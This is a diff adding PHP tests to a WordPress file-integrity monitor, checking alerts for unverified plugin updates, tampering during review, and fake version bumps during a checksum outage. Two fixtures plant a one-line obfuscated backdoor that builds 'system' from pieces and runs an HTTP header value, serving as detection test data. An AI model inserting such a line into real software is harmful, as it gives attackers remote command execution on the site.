@@ -183,12 +183,61 @@ t('Monitor: with no channels configured it refuses to run', function () {
     assertContains('no alert channels', $r['lines'][0]);
 });
 
-t('Monitor: a WordPress plugin update is explained, silent, and advances stored versions', function () {
+t('Monitor: an unverified plugin update alerts once, stays held until accepted, and tampering while it waits alerts again', function () {
+    $files = [
+        'wp-config.php' => '<?php',
+        'wp-content/plugins/premium/premium.php' => "<?php\n/*\nPlugin Name: Premium\nVersion: 2.0\n*/\n",
+        'wp-content/plugins/premium/inc/helper.php' => '<?php function helper() {}',
+    ];
+    [$root, $config, $state, $m, $n] = monitorFixture($files, ['profile' => 'wordpress', 'wp_checksums' => false]);
+    $state->writeJson('versions.json', VersionTracker::read($config));
+    bump($root, 'wp-content/plugins/premium/premium.php', "<?php\n/*\nPlugin Name: Premium\nVersion: 2.1\n*/\nfunction premium_new() {}\n");
+    assertSame(1, $m->run('check')['exit']);
+    assertSame(1, count($n->sent));
+    assertContains('unverified-update', $n->sent[0]['body']);
+    assertContains('accept --path=', $n->sent[0]['body']);
+    assertSame(['wp-content/plugins/premium' => '2.0'], $state->readJson('versions.json'), 'held: version not advanced');
+    assertSame(1, $m->run('check')['exit']);
+    assertSame(1, count($n->sent), 'still pending, not re-alerted');
+
+    // While the update waits for review, another file in the same plugin is changed.
+    bump($root, 'wp-content/plugins/premium/inc/helper.php', '<?php function helper() {} $f = "sys" . "tem"; $f($_SERVER["HTTP_X"] ?? "");');
+    assertSame(1, $m->run('check')['exit']);
+    assertSame(2, count($n->sent), 'a further change while pending must alert again');
+    assertContains('inc/helper.php', $n->sent[1]['body']);
+
+    // Reviewed and accepted: quiet afterwards, version advanced.
+    $r = Sentinel\Accept::run($config, $state, ['wp-content/plugins/premium'], false, []);
+    assertSame(0, $r['exit']);
+    assertSame(0, $m->run('check')['exit']);
+    assertSame('2.1', $state->readJson('versions.json')['wp-content/plugins/premium']);
+});
+
+t('Monitor: with auto-accept, a fake version during a wordpress.org outage is alerted, kept out of the baseline and not stored', function () {
+    $v1 = "<?php\n/*\nPlugin Name: Foo\nVersion: 1.0\n*/\nfunction foo() {}\n";
+    [$root, $config, $state, $m, $n, $http] = monitorFixture(
+        ['wp-includes/version.php' => "<?php\n\$wp_version = '6.4.2';\n", 'wp-content/plugins/foo/foo.php' => $v1],
+        ['profile' => 'wordpress', 'auto_accept_unverified_updates' => true]
+    );
+    $state->writeJson('versions.json', VersionTracker::read($config));
+    coreRoute($http, ['wp-includes/version.php' => "<?php\n\$wp_version = '6.4.2';\n"]);
+    $http->route('https://downloads.wordpress.org/plugin-checksums/', 503, 'unavailable');
+    putFile($root, 'wp-content/plugins/foo/foo.php', str_replace('Version: 1.0', 'Version: 1.0.9', $v1) . '$f = "sys" . "tem"; $f($_SERVER["HTTP_X"] ?? "");' . "\n");
+    $backdoor = hash_file('sha256', $root . '/wp-content/plugins/foo/foo.php');
+
+    assertSame(1, $m->run('check')['exit']);
+    assertSame(1, count($n->sent));
+    assertContains('unverified-update', $n->sent[0]['body']);
+    assertNotContains($backdoor, (string)file_get_contents($state->path('baseline.txt')));
+    assertSame('1.0', $state->readJson('versions.json')['wp-content/plugins/foo']);
+});
+
+t('Monitor: with auto_accept_unverified_updates a plugin update is explained, silent, and advances stored versions', function () {
     $files = [
         'wp-config.php' => '<?php',
         'wp-content/plugins/foo/foo.php' => "<?php\n/*\nPlugin Name: Foo\nVersion: 1.0\n*/\n// v1\n",
     ];
-    [$root, $config, $state, $m, $n] = monitorFixture($files, ['profile' => 'wordpress', 'wp_checksums' => false]);
+    [$root, $config, $state, $m, $n] = monitorFixture($files, ['profile' => 'wordpress', 'wp_checksums' => false, 'auto_accept_unverified_updates' => true]);
     $state->writeJson('versions.json', VersionTracker::read($config));
     bump($root, 'wp-content/plugins/foo/foo.php', "<?php\n/*\nPlugin Name: Foo\nVersion: 1.1\n*/\n// v2\n");
     $r = $m->run('check');
